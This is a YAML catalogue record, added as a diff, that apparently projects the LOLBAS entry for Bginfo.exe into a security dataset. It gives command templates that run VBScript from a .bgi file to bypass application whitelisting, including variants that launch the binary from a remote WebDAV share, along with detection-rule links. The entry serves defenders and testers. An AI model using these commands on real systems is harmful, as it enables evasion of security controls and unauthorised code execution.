@@ -1,0 +1,120 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL0JnaW5mby55bWw/QVdMIEJ5cGFzcw/1
+type: binary
+platform: windows
+name: Bginfo.exe
+phases:
+- defense-evasion
+- execution
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: medium
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml
+  - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
+commands:
+- template: bginfo.exe {PATH:.bgi} /popup /nolicprompt
+  comment: Execute VBscript code that is referenced within the specified .bgi file.
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Bginfo.exe
+      category: AWL Bypass
+      privileges: User
+      mitre_id: T1218
+      source_file: OtherMSBinaries/Bginfo.yml
+      command_source_index: 1
+      document_utf8: "---\nName: Bginfo.exe\nDescription: Background Information Utility included with\
+        \ SysInternals Suite\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: bginfo.exe\
+        \ {PATH:.bgi} /popup /nolicprompt\n    Description: Execute VBscript code that is referenced within\
+        \ the specified .bgi file.\n    Usecase: Local execution of VBScript\n    Category: Execute\n\
+        \    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\n    Tags:\n      - Execute:\
+        \ WSH\n  - Command: bginfo.exe {PATH:.bgi} /popup /nolicprompt\n    Description: Execute VBscript\
+        \ code that is referenced within the specified .bgi file.\n    Usecase: Local execution of VBScript\n\
+        \    Category: AWL Bypass\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\n\
+        \    Tags:\n      - Execute: WSH\n  - Command: \\\\10.10.10.10\\webdav\\bginfo.exe {PATH:.bgi}\
+        \ /popup /nolicprompt\n    Usecase: Remote execution of VBScript\n    Description: Execute bginfo.exe\
+        \ from a WebDAV server.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n   \
+        \ Tags:\n      - Execute: WSH\n    OperatingSystem: Windows\n  - Command: \\\\10.10.10.10\\webdav\\\
+        bginfo.exe {PATH:.bgi} /popup /nolicprompt\n    Usecase: Remote execution of VBScript\n    Description:\
+        \ Execute bginfo.exe from a WebDAV server.\n    Category: AWL Bypass\n    Privileges: User\n \
+        \   MitreID: T1218\n    OperatingSystem: Windows\n    Tags:\n      - Execute: WSH\n  - Command:\
+        \ \\\\live.sysinternals.com\\Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt\n    Usecase:\
+        \ Remote execution of VBScript\n    Description: This style of execution may not longer work due\
+        \ to patch.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem:\
+        \ Windows\n    Tags:\n      - Execute: WSH\n      - Execute: Remote\n  - Command: \\\\live.sysinternals.com\\\
+        Tools\\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt\n    Usecase: Remote execution of VBScript\n\
+        \    Description: This style of execution may not longer work due to patch.\n    Category: AWL\
+        \ Bypass\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows\n    Tags:\n\
+        \      - Execute: WSH\n      - Execute: Remote\nFull_Path:\n  - Path: no default\nDetection:\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_bginfo.yml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml\n\
+        \  - Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml\n\
+        \  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n\
+        Resources:\n  - Link: https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/\n\
+        Acknowledgement:\n  - Person: Oddvar Moe\n    Handle: '@oddvarmoe'\n"
+      document_sha256: sha256:2639d38ac1dbf8c79fb53101d98c9c5e8ce90fedf84cfe9ba2de42782151446b
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Bginfo/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:e580308f9ac0f5716e070bfe0bd6a55768a6303df19a685ed9442350b8773c3e
